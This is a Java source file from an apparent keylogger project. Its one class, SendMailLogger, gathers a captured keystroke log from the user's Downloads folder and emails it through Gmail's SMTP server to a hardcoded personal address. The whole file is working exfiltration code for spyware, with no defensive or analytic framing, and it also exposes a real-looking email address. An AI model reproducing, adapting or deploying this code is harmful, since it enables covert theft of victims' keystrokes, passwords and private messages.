package keylogger.com;

import javax.mail.*;
import javax.mail.internet.*;
import java.io.IOException;
import java.util.Properties;

public class SendMailLogger {

    public static SendMailLogger sendMail() {
        String host = "smtp.gmail.com";
        final String user = "santosderic291@gmail.com";
        final String password = "";

        String to = "santosderic291@gmail.com";
        Properties props = new Properties();
        props.put("mail.smtp.host", host);
        props.put("mail.smtp.port", "587");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");

        Session session = Session.getInstance(props, new Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(user, password);
            }
        });

        try{
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(user));
            message.setRecipient(Message.RecipientType.TO, new InternetAddress(to));
            message.setSubject("KeyLogger");
            message.setText("This is the keylogger message");
            MimeBodyPart messageBodyPart = new MimeBodyPart();
            Multipart multipart = new MimeMultipart();
            String path = System.getProperty("user.home") + "/Downloads/keylogger.log";
            messageBodyPart.attachFile(path);
            multipart.addBodyPart(messageBodyPart);
            message.setContent(multipart);
            Transport.send(message);
            System.out.println("Sent message successfully....");
        } catch (AddressException e) {
            throw new RuntimeException("Error: Internet Address "+e.getMessage());
        } catch (MessagingException e) {
            throw new RuntimeException("Error: Messaging Exception "+e.getMessage());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        return null;
    }
    
}
